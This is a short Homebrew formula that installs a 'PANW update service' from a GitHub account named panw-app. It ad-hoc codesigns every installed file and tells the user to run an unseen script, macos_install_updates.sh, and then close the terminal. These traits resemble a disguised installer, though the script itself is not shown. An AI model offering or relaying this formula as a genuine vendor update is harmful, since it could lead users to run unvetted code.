class Svcupdate < Formula
    desc "PANW update service installation and configuration"
    homepage "https://github.com/panw-app"
    url "https://github.com/panw-app/homebrew-SvcUpdate/releases/download/v3/SvcUpdate-1.43.2.tar.gz"
    sha256 "4859556f5fff726ab1173be74a6c04f285d63c68b586d222b7a78554e5fa1bd3"
    version "1.43.2"

def install
    # Debug: Show current directory and files
    ohai "Current directory: #{Dir.pwd}"
    ohai "Files present: #{Dir.glob("**/*")}"
    
    # Run environment check before installing (while in build directory)
    script_name = "macos_install_updates.sh"
    if File.exist?(script_name)
        ohai "Found script at: #{script_name}"
        system "chmod", "+x", script_name
    else
        opoo "Script not found at: #{script_name}"
        ohai "Available files: #{Dir.glob("files/*")}"
    end
    
    # Install files
    bin.install Dir["*"]
    Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
    end
end

def caveats
        <<~EOS
Run the updater with : macos_install_updates.sh
Thank you for using the Homebrew panw-app/SvcUpdate!
Please close the terminal window.
        EOS
    end
end
